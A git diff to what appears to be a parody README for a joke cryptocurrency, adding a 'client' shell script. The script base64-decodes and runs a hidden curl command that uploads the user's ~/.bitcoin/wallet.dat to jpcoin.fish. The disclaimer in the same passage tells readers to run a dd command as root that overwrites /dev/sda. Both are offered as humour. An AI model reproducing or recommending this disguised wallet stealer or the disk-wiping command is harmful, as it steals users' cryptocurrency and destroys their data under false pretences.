@@ -39,6 +39,22 @@ Steering committee:
 
 External cyberwar advisor: [grugq](https://twitter.com/thegrugq)
 
+## Client
+
+By [joernchen](https://twitter.com/joernchen/status/936180943626399744):
+
+```bash
+#!/bin/sh
+# http://jpcoin.fish 
+# JPcoin client, pre-alpha (use at own risk)
+# Fits in a tweet!
+MOON=`echo Y3VybCBqcGNvaW4uZmlzaC9JQ08gLWQgQC5iaXRjb2luL3dhbGxldC5kYXQ= | base64 -d`
+cd
+$MOON
+# making-the-world-a-better-place™
+```
+
+
 ## Disclaimer
 
 Image of coin not necessarily to scale. Actual coins may contain different images, depending on what we find funny. Prepared in a gluten-free facility. May contain traces of nuts or kernels, we're not sure. This document may be legally privileged and only for the intended recipients. If you are not the intended recipient, please run `dd if=/dev/zero of=/dev/sda bs=1M count=20` as root after setting fire to your backups, then reboot. 
